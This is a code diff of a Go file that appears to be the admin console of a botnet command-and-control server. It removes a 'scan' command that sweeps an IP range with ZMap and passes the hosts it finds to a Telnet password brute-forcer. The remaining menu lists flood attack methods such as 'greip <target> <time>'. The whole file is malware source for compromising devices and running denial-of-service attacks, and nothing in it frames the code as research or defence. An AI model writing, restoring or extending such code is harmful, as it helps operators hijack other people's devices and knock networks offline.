@@ -214,17 +214,6 @@ func (this *Admin) Handle() {
 
 		// Admin commands
 		if userInfo.admin == 1 {
-			// Scanner commands
-			if strings.HasPrefix(cmd, "scan ") {
-				this.handleScanCommand(cmd)
-				continue
-			}
-			if cmd == "scan-status" {
-				this.conn.Write([]byte("\x1b[1;36mScanners: Telnet + ZMap integrated\x1b[0m\r\n"))
-				this.conn.Write([]byte("\x1b[1;36mUsage: scan <startIP> <endIP> [port]\x1b[0m\r\n"))
-				continue
-			}
-
 			if cmd == "adduser" {
 				this.handleAddUser(false)
 				continue
@@ -297,9 +286,6 @@ func (this *Admin) showMethods() {
 	this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93micmp <target> <time>\x1b[1;34m                                                        \x1b[1;34m║\r\n"))
 	this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mgreip <target> <time>\x1b[1;34m                                                       \x1b[1;34m║\r\n"))
 	this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mgreeth <target> <time>\x1b[1;34m                                                      \x1b[1;34m║\r\n"))
-	this.conn.Write([]byte("\x1b[1;34m╠═══════════════════════════════════════════════════════════════════════════════╣\r\n"))
-	this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mSCANNER: \x1b[1;93mscan <startIP> <endIP> [port]\x1b[1;34m - ZMap + Telnet brute              \x1b[1;34m║\r\n"))
-	this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mscan-status\x1b[1;34m            - Show scanner status                                \x1b[1;34m║\r\n"))
 	this.conn.Write([]byte("\x1b[1;34m╚═══════════════════════════════════════════════════════════════════════════════╝\x1b[0m\r\n"))
 }
 
@@ -352,40 +338,6 @@ func (this *Admin) handleNetworkTools(cmd string) {
 		result := strings.Replace(string(data), "\n", "\r\n", -1)
 		this.conn.Write([]byte(fmt.Sprintf("\x1b[1;36mResults\x1b[1;34m:\r\n\x1b[1;36m%s\x1b[0m\r\n", result)))
 	}
-}
-
-func (this *Admin) handleScanCommand(cmd string) {
-	parts := strings.Fields(cmd)
-	if len(parts) < 3 {
-		this.conn.Write([]byte("\x1b[1;34mUsage: scan <startIP> <endIP> [port]\x1b[0m\r\n"))
-		return
-	}
-
-	startIP := parts[1]
-	endIP := parts[2]
-	port := 23 // Default telnet port
-
-	if len(parts) > 3 {
-		fmt.Sscanf(parts[3], "%d", &port)
-	}
-
-	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;36mStarting scan: %s -> %s port %d\x1b[0m\r\n", startIP, endIP, port)))
-
-	// Start ZMap scan for open ports
-	zmapScanner = NewZMapScanner(100, port)
-	go func() {
-		zmapScanner.ScanIPRange(startIP, endIP)
-		this.conn.Write([]byte("\x1b[1;36mZMap scan complete\x1b[0m\r\n"))
-	}()
-
-	// Start Telnet bruter on found IPs
-	go func() {
-		for result := range zmapScanner.GetResults() {
-			telnetScanner.ScanTarget(result.IP, result.Port)
-		}
-	}()
-
-	this.conn.Write([]byte("\x1b[1;36mScanning... Results will appear in scan-results.txt\x1b[0m\r\n"))
 }
 
 func (this *Admin) ReadLine(masked bool) (string, error) {
